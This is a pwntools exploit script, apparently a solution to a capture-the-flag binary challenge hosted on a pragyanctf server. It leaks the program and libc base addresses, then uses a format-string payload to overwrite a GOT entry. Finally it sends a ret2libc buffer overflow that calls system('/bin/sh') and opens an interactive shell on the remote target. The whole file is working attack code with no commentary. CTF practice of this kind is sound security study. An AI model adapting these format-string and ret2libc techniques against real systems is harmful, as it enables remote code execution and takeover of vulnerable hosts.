from pwn import *

# p = remote('localhost', 7777)
p = remote('binary.challs.pragyanctf.tech', 6005)
# p = process(['stdbuf', '-i0', '-o0', '-e0', './vuln'])
e = ELF('./vuln')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
context.binary = e

p.sendline(b'A')
p.recvuntil(b'no. is ')
e.address = int(p.recvline()[:-1], 16) - e.symbols['main']
print(hex(e.address))

p.sendlineafter(b'2.No\n', b'1')
p.sendlineafter(b'2.No\n', b'1')
p.sendlineafter(b'2.No\n', b'a')
p.sendlineafter(b'But....\n', fmtstr_payload(7, {e.got['fflush']:e.symbols['hid']})+b'!!!!!%91$p!!!!!')

p.recvuntil(b'!!!!!')
libc.address = int(p.recvuntil(b'!!!!!')[:-5], 16) - (libc.symbols['__libc_start_main'] + 245)
print(hex(libc.address))

payload = b'A' * 0x8c
payload += p32(libc.symbols['system'])
payload += b'AAAA'
payload += p32(next(libc.search(b'/bin/sh')))
p.sendline(payload)

p.interactive()
